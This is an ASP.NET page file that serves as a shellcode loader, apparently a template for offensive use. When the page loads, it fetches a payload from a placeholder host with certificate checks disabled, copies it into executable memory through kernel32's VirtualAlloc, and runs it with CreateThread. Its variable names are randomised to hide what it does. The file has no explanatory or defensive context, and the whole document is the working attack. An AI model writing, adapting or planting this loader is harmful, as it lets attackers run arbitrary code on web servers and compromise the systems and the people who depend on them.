<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.Services" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.NetworkInformation" %>
<%@ Import Namespace="System.Net.Security" %>

<script runat="server">
private static Int32 MEM_COMMIT=0x1000;
private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

[System.Runtime.InteropServices.DllImport("kernel32")]
private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);


protected void Page_Load(object sender, EventArgs e)
{
  string Url = "https://<yourhost>/<yourshellcode>";
  byte[] rzjUFlLZh;

  WebClient webClient = new WebClient();
  System.Net.ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
  System.Net.ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(delegate { return true; });
  webClient.UseDefaultCredentials = true;
  rzjUFlLZh = webClient.DownloadData(Url);
  
  IntPtr fvYV5t = VirtualAlloc(IntPtr.Zero,(UIntPtr)rzjUFlLZh.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  System.Runtime.InteropServices.Marshal.Copy(rzjUFlLZh,0,fvYV5t,rzjUFlLZh.Length);
  IntPtr owlqRoQI_ms = IntPtr.Zero;
  IntPtr vnspR2 = CreateThread(IntPtr.Zero,UIntPtr.Zero,fvYV5t,IntPtr.Zero,0,ref owlqRoQI_ms);
}

</script>
